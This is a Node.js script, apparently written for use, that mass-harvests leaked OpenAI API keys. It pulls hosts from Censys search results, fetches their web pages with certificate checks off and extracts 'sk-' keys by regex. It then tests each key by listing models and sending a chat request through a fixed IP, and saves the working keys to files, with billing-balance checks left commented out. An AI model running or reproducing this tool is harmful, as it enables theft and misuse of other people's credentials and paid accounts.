
const config = require('./config.json')

const https = require('https')
const http = require('http')
const fs = require('fs')

const target = 'api.openai.com'
const timeout = 30000
const continueTask = false

const censysStorageDir = `task/${target}/censys`
const resultStorageDir = `task/${target}/result`

const request = (cursor) => {
    return new Promise((resolve, reject) => {
        let data = ''
        const req = https.get(`https://search.censys.io/api/v2/hosts/search?per_page=100&virtual_hosts=EXCLUDE&q=${target}&cursor=${cursor}`, {
            auth: `${config.appId}:${config.secret}`,
            timeout
        }, (res) => {
            res.on('data', (chunk) => {
                data += chunk
            })
            res.on('end', () => {
                // console.log(data)
                resolve(JSON.parse(data))
            })
        })
    })
}

const HttpRequest = {
    HTTP: async (url) => {
        return new Promise((resolve, reject) => {
            let data = ''
            const req = http.get(url, {
                timeout,
                sessionTimeout: timeout
            }, (res) => {
                res.on('data', (chunk) => {
                    // console.log('chunk:', chunk.toString())
                    data += chunk
                })
                res.on('end', () => {
                    // console.log(data)
                    resolve(data)
                })
                res.on('error', (err) => {
                    reject(err)
                })
            })
            req.on('finish', () => {
                console.log('finish')
            })
            req.on('error', err => reject(err))
        })
    },
    HTTPS: async (url) => {
        return new Promise((resolve, reject) => {
            let data = ''
            const req = https.get(url, {
                rejectUnauthorized: false,
                timeout,
                sessionTimeout: timeout
            }, (res) => {
                res.on('data', (chunk) => {
                    // console.log('chunk:', chunk.toString())
                    data += chunk
                })
                res.on('end', () => {
                    // console.log(data)
                    resolve(data)
                })
                res.on('error', (err) => {
                    reject(err)
                })
            })
            req.on('finish', () => {
                console.log('finish')
            })
            req.on('error', err => reject(err))
        })
    },
}

class OpenAi {
    constructor(token) {
        this.token = token
        this.ip = '52.152.96.252'
    }

    /**
     * 获取订阅数据
     * @returns 
     */
    getSubscription() {
        return new Promise((resolve, reject) => {
            let data = ''

            const req = https.request({
                port: 443,
                host: '52.152.96.252',
                method: 'GET',
                path: 'https://api.openai.com/v1/dashboard/billing/subscription',
                rejectUnauthorized: false,
                timeout,
                headers: {
                    Authorization: `Bearer ${this.token}`
                }
            });

            req.end();
            req.on('response', (res) => {
                res.on('data', chunk => {
                    data += chunk
                })
                res.on('end', () => {
                    const ret = JSON.parse(data)
                    if (ret.error)
                        reject(ret)
                    else
                        resolve(ret)
                })
                res.on('error', err => {
                    reject(err)
                })
            });
            req.on('error', err => {
                reject(err)
            })

        })
    }

    /**
     * 获取已经使用的额度情况
     * @returns 
     */
    getUsage() {
        return new Promise((resolve, reject) => {
            let data = ''

            const now = new Date()
            const nowStr = `${now.getFullYear()}-${(now.getMonth() + 1 + '').padStart(2, '0')}-${(now.getDate() + '').padStart(2, '0')}`
            const old = new Date(now.getTime() - 95 * 24 * 60 * 60 * 1000)
            const oldStr = `${old.getFullYear()}-${(old.getMonth() + 1 + '').padStart(2, '0')}-${(old.getDate() + '').padStart(2, '0')}`
            // console.log(nowStr, ' -> ', oldStr)

            const req = https.request({
                port: 443,
                host: '52.152.96.252',
                method: 'GET',
                path: `https://api.openai.com/dashboard/billing/usage?start_date=${oldStr}&end_date=${nowStr}`,
                rejectUnauthorized: false,
                headers: {
                    Authorization: `Bearer ${this.token}`
                },
                timeout
            });

            req.end();
            req.on('response', (res) => {
                res.on('data', chunk => {
                    data += chunk
                })
                res.on('end', () => {
                    const ret = JSON.parse(data)
                    if (ret.error)
                        reject(ret)
                    else
                        resolve(ret)
                })
                res.on('error', err => {
                    reject(err)
                })
            });
            req.on('error', err => {
                reject(err)
            })

        })
    }

    /**
     * 获取余额相关数据
     */
    getCreditData() {
        return new Promise((resolve, reject) => {
            let data = ''
            const req = https.get(url, { timeout }, (res) => {
                res.on('data', (chunk) => {
                    data += chunk
                })
                res.on('end', () => {
                    const ret = JSON.parse(data)
                    if (ret.error)
                        reject(ret)
                    else
                        resolve(ret)
                })
                res.on('error', (err) => {
                    reject(err)
                })
            })
        })
    }

    /**
     * 检查对话是否可用
     */
    checkCompletion() {
        return new Promise((resolve, reject) => {
            let data = ''
            const body = {
                "model": "gpt-3.5-turbo",
                "stream": false,
                "messages": [
                    {
                        "role": "user",
                        "content": "hi"
                    }
                ]
            }
            const reqBody = JSON.stringify(body)
            const req = https.request({
                port: 443,
                host: '52.152.96.252',
                method: 'POST',
                path: 'https://api.openai.com/v1/chat/completions',
                rejectUnauthorized: false,
                headers: {
                    Authorization: `Bearer ${this.token}`,
                    'Content-Type': 'application/json',
                    // 'Content-Length': reqBody.length,
                },
                timeout
            });
            req.write(reqBody)
            req.end();
            req.on('response', (res) => {
                res.on('data', chunk => {
                    data += chunk
                })
                res.on('end', () => {
                    const ret = JSON.parse(data)
                    if (ret.error)
                        reject(ret)
                    else
                        resolve(ret)
                })
                res.on('error', err => {
                    reject(err)
                })
            });
            req.on('error', err => {
                reject(err)
            })

        })
    }

    /**
     * 获取模型数据
     */
    getModelList() {
        return new Promise((resolve, reject) => {
            let data = ''

            const req = https.request({
                port: 443,
                host: '52.152.96.252',
                method: 'GET',
                path: 'https://api.openai.com/v1/models',
                rejectUnauthorized: false,
                headers: {
                    Authorization: `Bearer ${this.token}`
                },
                timeout
            });

            req.end();
            req.on('response', (res) => {
                res.on('data', chunk => {
                    data += chunk
                })
                res.on('end', () => {
                    const ret = JSON.parse(data)
                    if (ret.error)
                        reject(ret)
                    else
                        resolve(ret)
                })
                res.on('error', err => {
                    reject(err)
                })
            });
            req.on('error', err => {
                reject(err)
            })

        })
    }
}

// 函数实现，参数单位 毫秒 ；
function wait(ms) {
    return new Promise(resolve => setTimeout(() => resolve(), ms));
};

(async () => {
    // 先抓取censys搜索结果
    console.log('start')
    let crawler = true
    let cursor = ''
    let page = 1;
    try {
        fs.mkdirSync(censysStorageDir, { recursive: true })
    } catch (error) {

    }
    if (fs.existsSync(`${censysStorageDir}/progress.json`)) {
        const progress = require(`./${censysStorageDir}/progress.json`)
        cursor = progress.cursor
        page = progress.page
        crawler = cursor && cursor.length > 0
    }

    while (crawler) {
        const resp = await request(cursor)

        const { next } = resp.result.links
        // console.log('resp:', resp)
        if (resp.code != 200) {
            console.error('寄！', resp)
            return
        }
        fs.writeFileSync(`${censysStorageDir}/page_${page}.json`, JSON.stringify(resp, null, 4))

        cursor = next
        page++;
        fs.writeFileSync(`${censysStorageDir}/progress.json`, JSON.stringify({
            cursor,
            page
        }, null, 4))

        // break
        if (!next) break
    }

    // 再处理数据
    const dir = fs.readdirSync(censysStorageDir)
    const pageList = dir.filter(e => e.startsWith('page_'))
    let progress = {}
    const progressLoc = `./${resultStorageDir}/progress.json`

    // 多线程，serverIndex是各自拥有
    if (continueTask && fs.existsSync(progressLoc)) {
        const p = require(progressLoc)
        progress = {
            ...progress,
            ...p
        }
    }
    const doPageTask = async (i, page, serverIndex, result) => {

        const resp = require(`./${censysStorageDir}/${page}`)

        const { hits: list } = resp.result
        for (let j = serverIndex; j < list.length; j++) {
            const host = list[j]
            console.log('pageIndex:', i, 'page:', page, 'serverIndex:', j)
            const { ip, services } = host
            const httpServices = services.filter(e => e.service_name === 'HTTP')
            for (const service of httpServices) {
                let newData = null
                let token = ''
                try {
                    console.log('处理：', `${service.extended_service_name}://${ip}:${service.port}`)
                    const html = await HttpRequest[service.extended_service_name](`${service.extended_service_name}://${ip}:${service.port}`)
                    // await wait(500);
                    if (!html.includes('Bearer') || !html.includes('sk-') || !html.includes('T3BlbkFJ')) {
                        console.warn('不包含token，跳过')
                        continue
                    }
                    const m = html.match(/sk-(.*?)['|"]/)
                    if (m == null) {
                        console.log('匹配失败', html)
                    }
                    token = `sk-${m[1]}`
                    console.log('token:', token)
                    const ai = new OpenAi(token)
                    console.log(`${token}:`, 'getModelList...')
                    const modelList = await ai.getModelList()
                    await wait(500);
                    // console.log('modelList:', modelList)
                    const idList = modelList.data.map(e => e.id)
                    // console.log('idList:', idList)
                    const isSupportGPT3 = idList.includes('gpt-3.5-turbo')
                    const isSupportGPT4 = idList.includes('gpt-4')
                    console.log(`${token}:`, '支持GPT3.5:', isSupportGPT3)
                    console.log(`${token}:`, '支持GPT4:', isSupportGPT4)
                    newData = {
                        url: `${ip}:${service.port}`,
                        token,
                        gpt3: isSupportGPT3,
                        gpt4: isSupportGPT4
                    }
                    try {
                            
                        const completion = await ai.checkCompletion()
                        console.log(`${token} - completion:`, completion)
                    } catch (error) {
                        console.log(`${token} - completion error:`, error)
                        newData = null
                    }
                    // console.log(`${token}:`, 'getSubscription...')
                    // console.log('newData.subscription:', newData.subscription)
                    // console.log('getUsage...')
                    // const usage = await ai.getUsage()
                    // newData.totalUsed = usage.total_usage / 100
                    // const sub = await ai.getSubscription()
                    // // await wait(500);
                    // newData.subscription = sub
                    // console.log(`${token}:`, '余额:', sub.hard_limit_usd, ' - ', newData.totalUsed, ' = ', sub.hard_limit_usd - newData.totalUsed)
                    // if(sub.hard_limit_usd - newData.totalUsed < 0) {
                    //     console.log(`${token}:`, '余额用完了')
                    //     newData = null
                    // }
                    // newData.usage = usage
                    // console.log('newData.usage:', newData.usage)

                    // 调用方法；
                    await wait(500);
                } catch (err) {
                    console.error(`${token}:`, `${service.extended_service_name}://${ip}:${service.port}error:`, err)
                } finally {
                    if (newData !== null)
                        result.push(newData)
                }
            }
            console.log('保存...')
            try {
                fs.mkdirSync(resultStorageDir, { recursive: true })
            } catch (err) {

            }
            fs.writeFileSync(`${resultStorageDir}/result_${page}`, JSON.stringify(result, null, 4))
            progress[page] = j + 1;
            fs.writeFileSync(progressLoc, JSON.stringify(progress, null, 4))
        }
    }
    for (let i = 0; i < pageList.length; i++) {
        const page = pageList[i]
        const result = []
        const resultLoc = `./${resultStorageDir}/result_${page}`
        if (continueTask && fs.existsSync(resultLoc)) {
            result.push(...require(resultLoc))
        }

        doPageTask(i, page, progress[page] || 0, result)
    }
})()
// console.log('req', req)
console.log('crawler')